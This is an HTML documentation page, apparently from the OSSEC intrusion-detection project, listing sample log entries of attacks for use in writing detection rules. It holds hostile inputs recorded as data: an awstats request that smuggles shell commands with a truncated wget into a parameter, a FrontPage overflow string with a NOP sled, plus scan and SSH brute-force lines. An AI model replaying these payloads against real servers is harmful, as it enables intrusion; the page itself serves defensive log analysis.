@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>Samples of logs that contain information about attacks &mdash; OSSEC</title>
+    
+    <link rel="stylesheet" href="../../../_static/basic.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/bootstrap-3.2.0/css/bootstrap.min.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/bootstrap-3.2.0/css/bootstrap-theme.min.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/bootstrap-sphinx.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/parallax.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../../../',
+        VERSION:     '2.8.2',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true
+      };
+    </script>
+    <script type="text/javascript" src="../../../_static/jquery.js"></script>
+    <script type="text/javascript" src="../../../_static/underscore.js"></script>
+    <script type="text/javascript" src="../../../_static/doctools.js"></script>
+    <script type="text/javascript" src="../../../_static/js/jquery-1.11.0.min.js"></script>
+    <script type="text/javascript" src="../../../_static/js/jquery-fix.js"></script>
+    <script type="text/javascript" src="../../../_static/bootstrap-3.2.0/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="../../../_static/bootstrap-sphinx.js"></script>
+    <link rel="author" title="About these documents" href="../../../about.html" />
+    <link rel="top" title="OSSEC" href="../../../index.html" />
+  
+<meta charset='utf-8'>
+<meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'>
+<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1'>
+<meta name="apple-mobile-web-app-capable" content="yes">
+
+  
+  
+  <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css" rel="stylesheet">
+  
+  <style type="text/css">
+    ul.ablog-archive {list-style: none; overflow: auto; margin-left: 0px}
+    ul.ablog-archive li {float: left; margin-right: 5px; font-size: 80%}
+  </style>
+
+  </head>
+  <body>
+
+  <div id="navbar" class="navbar navbar-inverse navbar-default ">
+    <div class="container">
+      <div class="navbar-header">
+        <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".nav-collapse">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="../../../index.html"><img src="../../../_static/ossec_logo_bare_small.png">
+          OSSEC</a>
+        <span class="navbar-text navbar-version pull-left"><b></b></span>
+      </div>
+
+        <div class="collapse navbar-collapse nav-collapse">
+          <ul class="nav navbar-nav">
+            
+                <li><a href="../../../about.html">About <i class="fa fa-info-circle"></i></a></li>
+                <li><a href="../../../blog.html">Blog <i class="fa fa-archive"></i></a></li>
+                <li><a href="../../">Documentaton <i class="fa fa-book"></i></a></li>
+                <li><a href="../../../downloads.html">Downloads <i class="fa fa-download"></i></a></li>
+            
+            
+              <li class="dropdown globaltoc-container">
+  <a role="button"
+     id="dLabelGlobalToc"
+     data-toggle="dropdown"
+     data-target="#"
+     href="../../../index.html">Site <b class="caret"></b></a>
+  <ul class="dropdown-menu globaltoc"
+      role="menu"
+      aria-labelledby="dLabelGlobalToc"></ul>
+</li>
+              
+            
+            
+              
+                
+              
+            
+            
+            
+            
+          </ul>
+
+          
+            
+<form class="navbar-form navbar-right" action="../../../search.html" method="get">
+ <div class="form-group">
+  <input type="text" name="q" class="form-control" placeholder="Search" />
+ </div>
+  <input type="hidden" name="check_keywords" value="yes" />
+  <input type="hidden" name="area" value="default" />
+</form>
+          
+        </div>
+    </div>
+  </div>
+
+<div class="container">
+  <div class="row">
+    <div class="col-md-12">
+      
+  <div class="section" id="samples-of-logs-that-contain-information-about-attacks">
+<h1>Samples of logs that contain information about attacks<a class="headerlink" href="#samples-of-logs-that-contain-information-about-attacks" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="nessus-scan-entries-in-a-web-server-log">
+<h2>Nessus scan entries in a web server log:<a class="headerlink" href="#nessus-scan-entries-in-a-web-server-log" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="nessus/nessus.html">Nessus Scan in a web server log</a></p>
+</div>
+<div class="section" id="latest-application-scans">
+<h2>Latest application scans:<a class="headerlink" href="#latest-application-scans" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="apache/apache.html">Apache attack samples</a></p>
+</div>
+<div class="section" id="apache-entry-with-command-execution-succeeded">
+<h2>Apache entry with command execution succeeded:<a class="headerlink" href="#apache-entry-with-command-execution-succeeded" title="Permalink to this headline">¶</a></h2>
+<div class="highlight-console"><div class="highlight"><pre><span class="go">a.b.c.d - - [13/Jan/2006:01:07:21 -0200] &quot;GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget...;echo%20YYY;echo|HTTP/1.0&quot; 404 291</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="apache-scan-looking-for-vulnerable-applications">
+<h2>Apache scan (looking for vulnerable applications):<a class="headerlink" href="#apache-scan-looking-for-vulnerable-applications" title="Permalink to this headline">¶</a></h2>
+<p>..code-block:: console</p>
+<blockquote>
+<div><p>100.149.117.1 - - [13/Jan/2006:01:03:30 -0200] &#8220;POST /blog/xmlrpc.php HTTP/1.0&#8221; 404 288</p>
+<p>100.149.117.1 - - [13/Jan/2006:01:03:31 -0200] &#8220;POST /blog/xmlsrv/xmlrpc.php HTTP/1.0&#8221; 404 295</p>
+<p>100.149.117.1 - - [13/Jan/2006:01:03:32 -0200] &#8220;POST /blogs/xmlsrv/xmlrpc.php HTTP/1.0&#8221; 404 296</p>
+<p>100.149.117.1 - - [13/Jan/2006:01:03:33 -0200] &#8220;POST /drupal/xmlrpc.php HTTP/1.0&#8221; 404 290</p>
+</div></blockquote>
+</div>
+<div class="section" id="squid-access-log-worm-scans">
+<h2>Squid access log (worm scans):<a class="headerlink" href="#squid-access-log-worm-scans" title="Permalink to this headline">¶</a></h2>
+<div class="highlight-console"><div class="highlight"><pre><span class="go">524 192.168.2.204 TCP_MISS/404 590 GET http://www.ordendeslichts.de/intern/xxx3.php? - DIRECT/81.201.107.6 text/html</span>
+
+<span class="go">3571 192.168.2.204 TCP_MISS/404 470 GET http://www.levada.ru/htmlarea/images/xxx3.php? - DIRECT/62.118.252.213</span>
+
+<span class="go">1 192.168.2.204 TCP_NEGATIVE_HIT/404 487 GET http://ala-bg.net/444.php - NONE/- text/html</span>
+
+<span class="go">1 192.168.2.204 TCP_NEGATIVE_HIT/404 396 GET http://www.connectesl.com/444.php - NONE/- text/html</span>
+
+<span class="go">1 192.168.2.204 TCP_NEGATIVE_HIT/404 543 GET http://www.chilotitomarino.cl/444.php - NONE/- text/html</span>
+
+<span class="go">0 192.168.2.204 TCP_NEGATIVE_HIT/404 543 GET http://www.chilotitomarino.cl/444.php - NONE/- text/html</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="squid-proxy-misuse-attempt-to-proxy-smtp-over-the-proxy">
+<h2>Squid proxy misuse &#8211; Attempt to proxy SMTP over the proxy:<a class="headerlink" href="#squid-proxy-misuse-attempt-to-proxy-smtp-over-the-proxy" title="Permalink to this headline">¶</a></h2>
+<div class="highlight-console"><div class="highlight"><pre><span class="go">0 192.168.2.135 TCP_DENIED/403 1382 CONNECT 65.54.245.104:25 - NONE/- text/html</span>
+
+<span class="go">2 192.168.2.135 TCP_DENIED/403 1378 CONNECT 4.79.181.14:25 - NONE/- text/html</span>
+
+<span class="go">0 192.168.2.135 TCP_DENIED/403 1390 GET http://www.ebay.com/ - NONE/- text/html</span>
+
+<span class="go">0 59.59.106.40 TCP_DENIED/403 1380 CONNECT 203.84.195.1:25 - NONE/- text/html</span>
+
+<span class="go">8 59.59.106.40 TCP_DENIED/403 1380 CONNECT 203.84.195.1:25 - NONE/- text/html</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="ssh-bruteforce-login">
+<h2>SSH bruteforce login:<a class="headerlink" href="#ssh-bruteforce-login" title="Permalink to this headline">¶</a></h2>
+<div class="highlight-console"><div class="highlight"><pre><span class="go">Oct  2 01:13:19 host sshd[19618]: Illegal user test from ::ffff:69.10.144.194&lt;br&gt;</span>
+<span class="go">Oct  2 01:13:19 host sshd[19618]: Address 69.10.144.194 maps to unknown.rackforce.com, but this does not map back to the address - POSSIBLE BREAKIN ATTEMPT!&lt;br&gt;</span>
+<span class="go">Oct  2 01:13:20 host sshd[19620]: Illegal user test from ::ffff:69.10.144.194&lt;br&gt;</span>
+<span class="go">Oct  2 01:13:20 host sshd[19620]: Address 69.10.144.194 maps to unknown.rackforce.com, but this does not map back to the address - POSSIBLE BREAKIN ATTEMPT!&lt;br&gt;</span>
+<span class="go">Oct  2 01:13:22 host sshd[19622]: Illegal user test from ::ffff:69.10.144.194&lt;br&gt;</span>
+<span class="go">Oct  2 01:13:22 host sshd[19622]: Address 69.10.144.194 maps to unknown.rackforce.com, but this does not map back to the address - POSSIBLE BREAKIN ATTEMPT!&lt;br&gt;</span>
+<span class="go">Oct  2 01:13:23 host sshd[19624]: Illegal user tester from ::ffff:69.10.144.194&lt;br&gt;</span>
+<span class="go">Oct  2 01:13:23 host sshd[19624]: Address 69.10.144.194 maps to unknown.rackforce.com, but this does not map back to the address - POSSIBLE BREAKIN ATTEMPT!&lt;br&gt;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="attempt-to-exploit-frontpage-with-payload-truncated">
+<h2>Attempt to exploit Frontpage with payload truncated:<a class="headerlink" href="#attempt-to-exploit-frontpage-with-payload-truncated" title="Permalink to this headline">¶</a></h2>
+<div class="highlight-console"><div class="highlight"><pre><span class="go">74.74.126.250 - - [02/Aug/2007:15:53:46 -0400] &quot;SEARCH /\x90................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">............................................................................................................................</span>
+<span class="go">.....................................................................................\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span>
+<span class="go">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\</span>
+<span class="go">x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x</span>
+<span class="go">90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9</span>
+<span class="go">0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span>
+<span class="go">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\</span>
+<span class="go">x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x</span>
+<span class="go">90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9</span>
+<span class="go">0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span>
+<span class="go">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\</span>
+<span class="go">x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x</span>
+<span class="go">90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9</span>
+<span class="go">0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span>
+<span class="go">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\</span>
+<span class="go">x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x</span>
+<span class="go">0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span>
+<span class="go">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; 414 271</span>
+
+<span class="go">74.74.126.250 - - [02/Aug/2007:15:54:17 -0400] &quot;POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1&quot; 406 288</span>
+</pre></div>
+</div>
+</div>
+</div>
+
+  <div class="section">
+  
+  
+  </div>
+
+    </div>
+      
+  </div>
+</div>
+<footer class="footer">
+  <div class="container">
+    <p class="pull-right">
+      <a href="#">Back to top</a>
+      
+    </p>
+    <p>
+        &copy; Copyright 2010-2015, OSSEC Project Team - OSSEC trademark and domain owned by Trend Micro, Inc. - Home page images courtesy of Pixbay.com.<br/>
+      Created using <a href="http://sphinx.pocoo.org/">Sphinx</a> 1.2.3.<br/>
+    </p>
+  </div>
+</footer>
+  </body>
+</html>
